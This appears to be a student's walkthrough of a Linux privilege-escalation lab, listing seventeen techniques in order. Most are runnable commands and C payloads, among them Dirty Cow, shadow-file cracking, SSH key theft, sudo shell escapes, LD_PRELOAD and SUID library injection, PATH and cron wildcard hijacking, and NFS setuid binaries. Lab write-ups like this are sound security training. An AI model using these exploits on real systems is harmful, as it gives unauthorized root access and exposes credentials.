# Linux PrivEsc Arena

Connect : `ssh -o HostKeyAlgorithms=+ssh-rsa TCM@10.48.133.217`

### 1. Privilege Escalation - Kernel Exploits

```
uname -r

cat /proc/version

Use linux-exploit-suggester.sh

Found Dirty Cow

Use Exploit (gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w && ./c0w)

In command prompt type: passwd
In command prompt type: id
```

### 2. Privilege Escalation - Stored Passwords (Config Files)

```
QUESTIONS:
1. In command prompt type: cat /home/user/myvpn.ovpn
2. From the output, make note of the value of the “auth-user-pass” directive.
3. In command prompt type: cat /etc/openvpn/auth.txt
4. From the output, make note of the clear-text credentials.
5. In command prompt type: cat /home/user/.irssi/config | grep -i passw
6. From the output, make note of the clear-text credentials.

-----------------------------------------------------------------------------

TCM@debian:~$ cat myvpn.ovpn 
client
dev tun
proto udp
remote 10.10.10.10 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
tls-client
remote-cert-tls server
auth-user-pass /etc/openvpn/auth.txt
comp-lzo
verb 1
reneg-sec 0

TCM@debian:~$ cat /etc/openvpn/auth.txt
user
password321
TCM@debian:~$ cat /home/user/.irssi/config | grep -i passw
    autosendcmd = "/msg nickserv identify password321 ;wait 2000";
```

### 3. Privilege Escalation - Stored Passwords (History)

```
history
```

### 4. Privilege Escalation - Weak File Permissions

```
cat /etc/passwd

ls -al /etc/shadow

cat /etc/shadow

[Copy both files contents in the attacker machine]

[On Attacker Machine] unshadow passwd shadow > unshadow.hashes

hashcat -m 1800 -a 0 unshadow.hashes rockyou.txt
```

### 5. Privilege Escalation - SSH Keys

```
find / -name id_rsa 2> /dev/null         
/backups/supersecretkeys/id_rsa

cat /backups/supersecretkeys/id_rsa

[Copy that files content on attacker machine]

[On Attacker Machine] chmod 600 id_rsa

ssh -i ./id_rsa \                                                             28m 45.83s
      -o HostKeyAlgorithms=+ssh-rsa \
      -o PubkeyAcceptedAlgorithms=+ssh-rsa \
      -o IdentitiesOnly=yes \
      root@10.49.147.129
```

### 6. Privilege Escalation - Sudo (Shell Escaping)

```
sudo -l
[OUTPUT]

Priv Esc ways:
a. sudo find /bin -name nano -exec /bin/sh \;
b. sudo awk 'BEGIN {system("/bin/sh")}'
c. echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
d. sudo vim -c '!sh'
```

### 7. Privilege Escalation - Sudo (Abusing Intended Functionality)

```
Linux VM

1. In command prompt type:
sudo apache2 -f /etc/shadow
2. From the output, copy the root hash.

Attacker VM

1. Open command prompt and type:
echo '[Pasted Root Hash]' > hash.txt
2. In command prompt type:
john --wordlist=/usr/share/wordlists/nmap.lst hash.txt
3. From the output, notice the cracked credentials.
```

### 8. Privilege Escalation - Sudo (LD_PRELOAD)

```
1. In command prompt type: sudo -l
2. From the output, notice that the LD_PRELOAD environment variable is intact.

Exploitation

1. Open a text editor and type:

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

2. Save the file as x.c
3. In command prompt type:
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
4. In command prompt type:
sudo LD_PRELOAD=/tmp/x.so apache2
5. In command prompt type: id
```

### 9. Privilege Escalation - SUID (Shared Object Injection)

```
Detection

Linux VM

1. In command prompt type: find / -type f -perm -04000 -ls 2>/dev/null
2. From the output, make note of all the SUID binaries.
3. In command line type:
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
4. From the output, notice that a .so file is missing from a writable directory.

Exploitation

Linux VM

5. In command prompt type: mkdir /home/user/.config
6. In command prompt type: cd /home/user/.config
7. Open a text editor and type:

#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}

8. Save the file as libcalc.c
9. In command prompt type:
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
10. In command prompt type: /usr/local/bin/suid-so
11. In command prompt type: id
```

### 10. Privilege Escalation - SUID (Symlinks)

```
Detection

Linux VM

1. In command prompt type: dpkg -l | grep nginx
2. From the output, notice that the installed nginx version is below 1.6.2-5+deb8u3.

Exploitation

Linux VM – Terminal 1

1. For this exploit, it is required that the user be www-data. To simulate this escalate to root by typing: su root
2. The root password is password123
3. Once escalated to root, in command prompt type: su -l www-data
4. In command prompt type: /home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log
5. At this stage, the system waits for logrotate to execute. In order to speed up the process, this will be simulated by connecting to the Linux VM via a different terminal.

Linux VM – Terminal 2

1. Once logged in, type: su root
2. The root password is password123
3. As root, type the following: invoke-rc.d nginx rotate >/dev/null 2>&1
4. Switch back to the previous terminal.

Linux VM – Terminal 1

1. From the output, notice that the exploit continued its execution.
2. In command prompt type: id
```

### 11. Privilege Escalation - SUID (Environment Variables #1)

```
Detection

Linux VM

1. In command prompt type: find / -type f -perm -04000 -ls 2>/dev/null
2. From the output, make note of all the SUID binaries.
3. In command prompt type: strings /usr/local/bin/suid-env
4. From the output, notice the functions used by the binary.

Exploitation

Linux VM

1. In command prompt type:
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
2. In command prompt type: gcc /tmp/service.c -o /tmp/service
3. In command prompt type: export PATH=/tmp:$PATH
4. In command prompt type: /usr/local/bin/suid-env
5. In command prompt type: id
```

### 12. Privilege Escalation - SUID (Environment Variables #2)

```
Detection

Linux VM

1. In command prompt type: find / -type f -perm -04000 -ls 2>/dev/null
2. From the output, make note of all the SUID binaries.
3. In command prompt type: strings /usr/local/bin/suid-env2
4. From the output, notice the functions used by the binary.

Exploitation Method #1

Linux VM

1. In command prompt type:
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
2. In command prompt type:
export -f /usr/sbin/service
3. In command prompt type: /usr/local/bin/suid-env2

Exploitation Method #2

Linux VM

1. In command prompt type:
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
```

### 13. Privilege Escalation - Capabilities

```
Detection

Linux VM

1. In command prompt type: getcap -r / 2>/dev/null
2. From the output, notice the value of the “cap_setuid” capability.

Exploitation

Linux VM

1. In command prompt type:
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
2. Enjoy root!
```

### 14. Privilege Escalation - Cron (Path)

```
Detection

1. In command prompt type: cat /etc/crontab
2. From the output, notice the value of the “PATH” variable.
[locate overwrite.sh] /usr/local/bin/overwrite.sh
Exploitation

1. In command prompt type:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /usr/local/bin/overwrite.sh
2. In command prompt type: chmod +x /usr/local/bin/overwrite.sh
3. Wait 1 minute for the Bash script to execute.
4. In command prompt type: /tmp/bash -p
5. In command prompt type: id
```

### 15. Privilege Escalation - Cron (Wildcards)

```
Detection

Linux VM

1. In command prompt type: cat /etc/crontab
2. From the output, notice the script “/usr/local/bin/compress.sh”
3. In command prompt type: cat /usr/local/bin/compress.sh
4. From the output, notice the wildcard (*) used by ‘tar’.

Exploitation

Linux VM

1. In command prompt type:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
2. touch /home/user/--checkpoint=1
3. touch /home/user/--checkpoint-action=exec=sh\ runme.sh
4. Wait 1 minute for the Bash script to execute.
5. In command prompt type: /tmp/bash -p
6. In command prompt type: id
```

### 16. Privilege Escalation - Cron (File Overwrite)

```
Linux VM

1. In command prompt type: cat /etc/crontab
2. From the output, notice the script “overwrite.sh”
3. In command prompt type: ls -l /usr/local/bin/overwrite.sh
4. From the output, notice the file permissions.

Exploitation

Linux VM

1. In command prompt type:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
2. Wait 1 minute for the Bash script to execute.
3. In command prompt type: /tmp/bash -p
4. In command prompt type: id
```

### 17. Privilege Escalation - NFS Root Squashing

```
Detection

Linux VM

1. In command line type: cat /etc/exports
2. From the output, notice that “no_root_squash” option is defined for the “/tmp” export.

Exploitation

Attacker VM

1. Open command prompt and type: showmount -e 10.49.148.145
2. In command prompt type: mkdir /tmp/1
3. In command prompt type: sudo mount -t nfs -o rw,vers=3 10.49.148.145:/tmp /tmp/1
In command prompt type:
nano /tmp/1/x.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;
}

4. In command prompt type: gcc /tmp/1/x.c -o /tmp/1/x
5. In command prompt type: chmod +s /tmp/1/x

Linux VM

1. In command prompt type: /tmp/x
2. In command prompt type: id


[COMMANDS I USED]

[ATTACKER]
sudo umount /tmp/1 2>/dev/null
sudo mount -t nfs -o rw,vers=3 10.49.148.145:/tmp /tmp/1
nano /tmp/1/x.c
sudo gcc -static /tmp/1/x.c -o /tmp/1/x
sudo chmod 4755 /tmp/1/x

[VICTIM]
/tmp/x
```
